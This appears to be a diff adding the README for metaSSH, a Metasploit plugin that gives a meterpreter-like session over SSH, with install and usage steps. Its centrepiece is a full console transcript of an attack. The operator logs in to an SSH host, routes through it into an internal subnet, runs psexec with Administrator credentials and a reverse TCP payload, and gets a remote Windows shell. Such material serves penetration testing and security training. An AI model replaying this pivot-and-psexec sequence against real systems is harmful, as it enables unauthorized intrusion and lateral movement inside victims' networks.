@@ -1,0 +1,172 @@
+metaSSH session plugin for metasploit v0.1
+==========================================
+
+metaSSH is a session plugin for metasploit that gives you a meterpreter like interface over an ssh connection. When I started writing this code I just wanted to be able to cleanly reverse pivot over ssh from within metasploit but I guess I got a bit carried away. 
+
+
+Features
+--------
+
+* Multi-channel
+* SFTP over same connection
+* Pivoting & reverse pivoting via "route"
+* Scriptable
+* Supports post-exploitation modules
+* Meterpreter-like api 
+
+Example
+-------
+
+Here is an example of using metaSSH to pivot through an ssh host at 192.168.56.4 to run psexec on a win2k box at 192.168.57.4, inside the internal subnet. The reverse tcp payload then reverse pivots (automagically) through our ssh box to give us a shell.
+
+            =[ metasploit v4.2.0-dev [core:4.2 api:1.0]
+     + -- --=[ 778 exploits - 415 auxiliary - 121 post
+     + -- --=[ 238 payloads - 27 encoders - 8 nops
+     
+     msf > setg LogLevel 3
+     LogLevel => 3
+     msf > load meta_ssh
+     payloads/singles/ssh/metassh_session.rb
+     exploits/multi/ssh/login_password.rb
+     [*] Successfully loaded plugin: metaSSH
+     msf > use multi/ssh/login_password
+     msf > set RHOST 192.168.56.3
+     RHOST => 192.168.56.3
+     msf > set USER dsl
+     USER => dsl
+     msf > set PASS reverse
+     PASS => reverse
+     msf > set PAYLOAD ssh/metassh_session
+     PAYLOAD => ssh/metassh_session
+     msf > exploit -z
+     [*] Connecting to dsl@192.168.56.3:22 with password reverse
+     [*] metaSSH session 1 opened (127.0.0.1 -> 192.168.56.3:22) at 2011-12-28 03:51:16 +1300
+     [*] Session 1 created in the background.
+     msf > route add 192.168.57.0 255.255.255.0 1
+     [*] Route added
+     msf > use exploit/windows/smb/psexec
+     msf > set RHOST 192.168.57.4
+     RHOST => 192.168.57.4
+     msf > set LHOST 192.168.57.3
+     LHOST => 192.168.57.3
+     msf > set LPORT 5557
+     LPORT => 5557
+     msf > set SMBUser Administrator
+     SMBUser => Administrator
+     msf > set SMBPass password
+     SMBPass => password
+     msf > set PAYLOAD windows/shell_reverse_tcp
+     PAYLOAD => windows/shell_reverse_tcp
+     msf > exploit
+     [*] Started reverse handler on 192.168.57.3:5557 via the metaSSH on session 1
+     [*] Connecting to the server...
+     [*] Authenticating to 192.168.57.4:445|WORKGROUP as user 'Administrator'...
+     [*] Uploading payload...
+     [*] Created \ekuCbYaL.exe...
+     [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.4[\svcctl] ...
+     [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.4[\svcctl] ...
+     [*] Obtaining a service manager handle...
+     [*] Creating a new service (TCzOpXwW - "MvQGwrInlegXtnXAgQmQ")...
+     [*] Closing service handle...
+     [*] Opening service...
+     [*] Starting the service...
+     [*] Removing the service...
+     [*] Closing service handle...
+     [*] Deleting \ekuCbYaL.exe...
+     [*] Command shell session 2 opened (127.0.0.1:43621 -> 127.0.0.1:50324) at 2011-12-28 03:51:18 +1300
+     
+     Microsoft Windows 2000 [Version 5.00.2195]
+     (C) Copyright 1985-1999 Microsoft Corp.
+     
+     C:\WINNT\system32>^Z
+     Background session 2? [y/N]  y
+     msf  exploit(psexec) > sessions -i 1
+     [*] Starting interaction with 1...
+     
+     metaSSH > help
+     
+     Core Commands
+     =============
+     
+         Command       Description
+         -------       -----------
+         ?             Help menu
+         background    Backgrounds the current session
+         bgkill        Kills a background metaSSH script
+         bglist        Lists running background scripts
+         bgrun         Executes a metaSSH script as a background thread
+         channel       Displays information about active channels
+         close         Closes a channel
+         exit          Terminate the ssh session
+         help          Help menu
+         info          Displays information about a Post module
+         interact      Interacts with a channel
+         irb           Drop into irb scripting mode
+         quit          Terminate the ssh session
+         run           Executes a metaSSH script or Post module
+         use           Deprecated alias for 'load'
+     
+     
+     Stdapi: System Commands     
+     =======================
+     
+         Command       Description
+         -------       -----------
+         execute       Execute a command
+         shell         Drop into a system command shell
+     
+     
+     Stdapi: Net Commands
+     ====================
+     
+         Command       Description
+         -------       -----------
+         portfwd       forward local port to remote port
+     
+     
+     Stdapi: File system Commands
+     ============================
+     
+         Command       Description
+         -------       -----------
+         cat           Read the contents of a file to the screen
+         cd            Change directory
+         del           Delete the specified file
+         download      Download a file or directory
+         edit          Edit a file
+         getlwd        Print local working directory
+         getwd         Print working directory
+         lcd           Change local working directory
+         lpwd          Print local working directory
+         ls            List files
+         mkdir         Make directory
+         pwd           Print working directory
+         rm            Delete the specified file
+         rmdir         Remove directory
+         search        Search for files
+         upload        Upload a file or directory
+     
+     metaSSH >
+
+
+Installation
+------------
+
+Make sure you are running the **latest** version of metasploit from github, metaSSH requires recent fixes to the bundled net/ssh library.
+
+    git clone https://github.com/rapid7/metasploit-framework.git
+
+Get the latest version of metaSSH
+
+    git clone git@github.com:dirtyfilthy/metassh.git
+
+Copy meta_ssh.rb & the meta\_ssh directory to your metasploit plugins directory
+
+    cp -r meta_ssh.rb meta_ssh ~/metasploit/plugins
+
+Usage
+-----
+
+After installation in msfconsole run "load meta\_ssh" to load the plugin. Two new exploit modules and one new payload module will become available. The exploits "exploits/multi/ssh/login\_password" & "exploits.multi/ssh/pubkey" both let you login to an ssh server through different means and are fairly self explanatory. The payload for each of these must be "payloads/singles/ssh/metassh_session" which will spawn metaSSH.  
+    
+
